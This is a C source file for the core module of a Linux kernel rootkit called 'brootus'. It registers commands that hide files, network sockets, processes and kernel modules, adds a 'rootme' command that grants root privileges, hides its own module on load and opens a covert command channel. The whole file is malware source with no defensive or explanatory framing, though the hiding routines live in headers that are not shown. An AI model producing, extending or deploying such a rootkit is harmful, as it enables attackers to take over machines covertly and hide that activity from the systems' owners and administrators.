#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/sched.h>

#include "vt_channel.h"
#include "file_hiding.h"
#include "module_hiding.h"
#include "socket_hiding.h"
#include "process_hiding.h"
#include "rootshell.h"

#define CMD_DELEGATE_ARG(f, arg) static inline void cmd_##f(char* data) { f(arg); }
#define CMD_DELEGATE(f) static inline void cmd_##f(char* data) { f(); }

MODULE_LICENSE("GPL");

// Command delegate
CMD_DELEGATE(enable_file_hiding);
CMD_DELEGATE(disable_file_hiding);
CMD_DELEGATE(enable_socket_hiding);
CMD_DELEGATE(disable_socket_hiding);
CMD_DELEGATE(enable_process_hiding);
CMD_DELEGATE(disable_process_hiding);
CMD_DELEGATE(enable_module_hiding);
CMD_DELEGATE(disable_module_hiding);
CMD_DELEGATE_ARG(hide_module, &__this_module);
CMD_DELEGATE_ARG(unhide_module, &__this_module);
CMD_DELEGATE(root_me);

int __init init(void)
{
	// Setup the commands
	// Turn features on/off
	add_command("files_on", cmd_enable_file_hiding);
	add_command("files_off", cmd_disable_file_hiding);
	add_command("sockets_on", cmd_enable_socket_hiding);
	add_command("sockets_off", cmd_disable_socket_hiding);
	add_command("processes_on", cmd_enable_process_hiding);
	add_command("processes_off", cmd_disable_process_hiding);
	add_command("modules_on", cmd_enable_module_hiding);
	add_command("modules_off", cmd_disable_module_hiding);

	// For histotical reasons these hide/unhide this module
	add_command("mod_hide", cmd_hide_module);
	add_command("mod_unhide", cmd_unhide_module);

	// Configure hiding
	add_command("prefix", set_file_prefix);
	add_command("ports", set_socket_ports);
	add_command("pids", set_pids);
	add_command("hidemod", set_module_hidden);
	add_command("showmod", set_module_visible);

	add_command("rootme", cmd_root_me);

	// Initialize the brootus modules
	init_file_hiding();
	init_socket_hiding();
	init_process_hiding();
	init_module_hiding();

	// Hide our module
	hide_module(&__this_module);

  // Establish the covert channnel
	init_vt_channel();

	return 0;
}

void __exit cleanup(void)
{
	// Close the covert channel
	finalize_vt_channel();

	// Unload the brootus modules
	finalize_file_hiding();
	finalize_socket_hiding();
	finalize_process_hiding();
	finalize_module_hiding();
}

module_init(init);
module_exit(cleanup);
